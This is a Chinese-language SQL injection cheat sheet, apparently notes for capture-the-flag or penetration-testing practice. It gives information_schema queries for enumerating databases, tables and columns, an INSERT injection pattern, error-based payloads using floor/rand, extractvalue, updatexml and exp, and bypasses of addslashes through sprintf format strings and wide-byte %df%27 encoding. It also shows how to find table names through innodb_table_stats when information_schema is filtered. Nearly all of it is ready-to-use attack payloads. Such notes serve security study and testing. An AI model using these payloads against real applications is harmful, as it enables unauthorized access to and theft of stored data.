#SQL注入

## 爆数据

### information_schema

`````mysql
information_schema的表tables中的列table_schema记录了所有数据库的名字
information_schema的表tables中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列table_schema记录了所有数据库的名字
information_schema的表columns中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列column_name记录了所有数据库的表的列的名字
`````

###爆数据库

`database()`

``````mysql
SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA;
``````

### 爆表

``````mysql
SELECT group_concat(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = '数据库名称';
``````

### 爆字段

``````mysql
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '表名称';
``````

## insert 注入

考察insert语法 

``````mysql
INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,...,值n)
``````

若值i可以控制,不妨构造如下sql语句

``````mysql
INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,...,值i,...,值n),(值1,...,值i-1,(需要的sql语句),值i+1,...,值n)
``````



## 错误注入总结

1.`and (select 1 from (select count(*),concat((*******),floor(rand(0)*2))x from information_schema.tables group by x)a);` 无长度限制

2.`and (extractvalue(1,concat(1,(****))));`只能32位

3.`and (updatexml(1,concat(0x7e,(****),0x7e),1));` mysql >5.1.5

4.`and exp(~(select * from(****)a));`mysql>5.5.5



## 格式化字符串漏洞绕过addslashes

如果我们能在格式化字符串中拼接`%‘ or 1=1#`，进入服务器后addslashes结果变成`%\' or 1=1#`，再拼接入待格式化的sql语句：

```sql
SELECT username, password FROM users where username='%\' or 1=1#'
```

因为`%\`不是任何一种输出类型，格式化后得到：

```sql
SELECT username, password FROM users where username='' or 1=1#'
```

成功逃逸但是可能会出现php报错：`PHP Warning: sprintf(): Too few arguments`
可以使用这样的payload:`%1$'`不会引起相关报错

## 宽字节注入绕过addslashes

`'` 转义之后 变为 `\'` ,若`%df%27`转义成`%df%5c%27` = `運'`引号逃逸

## 绕过information_schema

过滤了 `or` 导致没有办法通过 `information_schema` 库来查询表名，然而其实`MySQL` 5.7 之后的版本，在其自带的 `mysql` 库中，新增了 `innodb_table_stats `和 `innodb_index_stats` 这两张日志表。如果数据表的引擎是`innodb` ，则会在这两张表中记录表、键的信息 。